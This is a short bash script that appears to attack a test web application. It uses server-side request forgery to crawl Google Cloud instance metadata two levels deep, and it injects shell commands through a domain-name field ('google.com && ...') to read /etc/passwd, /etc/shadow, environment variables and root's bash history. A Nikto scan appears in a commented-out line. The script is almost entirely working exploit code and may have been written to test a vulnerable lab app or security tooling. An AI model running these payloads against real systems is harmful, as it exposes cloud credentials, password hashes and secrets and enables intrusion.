#!/bin/bash

BASE_URL="http://metadata.google.internal/computeMetadata/v1/"
SSRF_ARRAY=()
# These are commands that will be injected
CMD_INJECT_ARRAY=(
    "ls /etc/"
    "cat /etc/passwd"
    "cat /etc/shadow"
    "env"
    "cat /root/.bash_history"
)

# function for curl command
# TYPE options: test-website or test-domain
# PATH options:
#   test-website: this is the segment added to the BASE_URL. It can be empty
#   test-domain: this command you want to inject
curl_command() {
    TYPE=$1
    PATH=$2
    /usr/bin/curl --location --request POST ${ATTACK_URL}/${TYPE} \
        --header 'Content-Type: application/json' \
        --data-raw "$(
            if [[ ${TYPE} == 'test-website' ]]; then
                echo '{
                    "url":"'${BASE_URL}''${PATH}'",
                    "customHeaderKey":"Metadata-Flavor",
                    "customHeaderValue":"Google"
                }'
            else
                echo '{
                    "domainName":"google.com && '${PATH}'"
                }'
            fi
        )"
}

# Server-Side Request Forgery vulnerability
# This will run SSRF attack one segments 2 layers deep

# Get first set of segments using test-website
SSRF_ARRAY=( $(curl_command test-website) )

# add child segments from the initial run
for i in ${!SSRF_ARRAY[@]}
do
  SSRF_ARRAY_TMP=( $(curl_command test-website ${SSRF_ARRAY[$i]}) )
    for j in ${!SSRF_ARRAY_TMP[@]}
    do
      SSRF_ARRAY+=( ${SSRF_ARRAY[$i]}${SSRF_ARRAY_TMP[$j]} )
    done
done

# Command injection vulnerability
for i in ${!CMD_INJECT_ARRAY[@]}
do
  curl_command test-domain "${CMD_INJECT_ARRAY[$i]}"
done

# Nikto scan tool attack
# /usr/bin/nikto -host 127.0.0.1 -port 4000
# attack more endpoints?
